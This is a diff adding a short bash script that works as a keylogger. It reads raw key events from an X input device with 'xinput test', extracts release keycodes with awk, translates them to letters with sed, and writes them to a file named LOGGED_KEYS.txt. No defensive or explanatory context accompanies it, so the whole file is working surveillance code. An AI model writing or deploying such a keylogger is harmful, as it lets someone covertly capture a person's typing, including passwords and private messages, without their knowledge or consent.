@@ -1,0 +1,25 @@
+#!/bin/bash
+
+KEYBOARD_ID=10
+
+logKeystrokes() {
+    beginReadingKeycodes | extractKeycode | keycodeToChar | removeKeycodeIfUnknown > LOGGED_KEYS.txt
+}
+
+beginReadingKeycodes() {
+    stdbuf -o0 xinput test $KEYBOARD_ID
+}
+
+extractKeycode() {
+    awk '$2 == "release" { print $3; fflush(stdout) }'
+}
+
+keycodeToChar() {
+    sed -u "s/38/a/;s/56/b/;s/54/c/;s/40/d/;s/26/e/;s/41/f/;s/42/g/;s/43/h/;s/31/i/;s/44/j/;s/45/k/;s/46/l/;s/58/m/;s/57/n/;s/32/o/;s/33/p/;s/24/q/;s/27/r/;s/39/s/;s/28/t/;s/30/u/;s/55/v/;s/25/w/;s/53/x/;s/29/y/;s/52/z/"
+}
+
+removeKeycodeIfUnknown() {
+    sed -u "s/[0-9]\+//"
+}
+
+logKeystrokes
